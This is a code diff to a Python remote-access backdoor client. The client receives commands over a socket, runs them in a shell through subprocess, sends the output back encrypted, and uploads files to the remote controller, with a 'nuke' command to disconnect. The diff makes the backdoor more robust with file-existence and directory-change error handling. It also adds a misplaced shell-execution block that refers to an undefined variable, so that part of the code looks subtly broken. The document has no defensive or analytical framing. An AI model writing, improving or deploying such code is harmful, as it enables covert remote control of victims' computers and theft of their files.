@@ -100,8 +100,14 @@ def connect():
         f.close()
 
     def upload(filename):
-        f= open(filename, 'rb')
-        s.send(f.read())
+        if os.path.exists(filename):
+            f= open(filename, 'rb')
+            s.send(f.read())
+        else:
+            print('\t[!] File does not exist!')
+            CMD = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = CMD.stdout.read() + CMD.stderr.read()
+            s.send(encrypt(result))
 
     while True:
         command = s.recv(1024)
@@ -109,7 +115,10 @@ def connect():
         if command == 'nuke':
             break
         elif command[:3] == 'cd ':
-            os.chdir(command[3:])
+            try:
+                os.chdir(command[3:])
+            except FileNotFoundError as e:
+                pass
         elif 'clear' in command:
             pass
         elif command == 'help':
@@ -124,5 +133,3 @@ def connect():
             result = CMD.stdout.read() + CMD.stderr.read()
             s.send(encrypt(result))
 connect()
-
-
